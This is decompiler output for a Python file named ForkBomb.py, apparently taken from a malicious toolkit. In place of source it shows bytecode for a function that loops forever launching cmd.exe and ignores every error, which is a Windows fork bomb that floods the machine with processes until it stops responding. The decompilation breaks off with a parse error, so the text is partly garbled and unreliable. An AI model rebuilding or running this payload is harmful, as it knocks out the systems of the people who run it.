# uncompyle6 version 3.7.4
# Python bytecode 3.8 (3413)
# Decompiled from: Python 3.8.11 (default, Jun 29 2021, 19:54:56) 
# [GCC 8.3.0]
# Embedded file name: Core\Bomb\ForkBomb.py
import os

def Forkbomb--- This code section failed: ---

 L.  10         0  SETUP_FINALLY        16  'to 16'

 L.  11         2  LOAD_GLOBAL              os
                4  LOAD_METHOD              startfile
                6  LOAD_STR                 'cmd.exe'
                8  CALL_METHOD_1         1  ''
               10  POP_TOP          
               12  POP_BLOCK        
               14  JUMP_BACK             0  'to 0'
             16_0  COME_FROM_FINALLY     0  '0'

 L.  12        16  POP_TOP          
               18  POP_TOP          
               20  POP_TOP          

 L.  13        22  POP_EXCEPT       
               24  JUMP_BACK             0  'to 0'
               26  <48>             
               28  JUMP_BACK             0  'to 0'

Parse error at or near `<48>' instruction at offset 26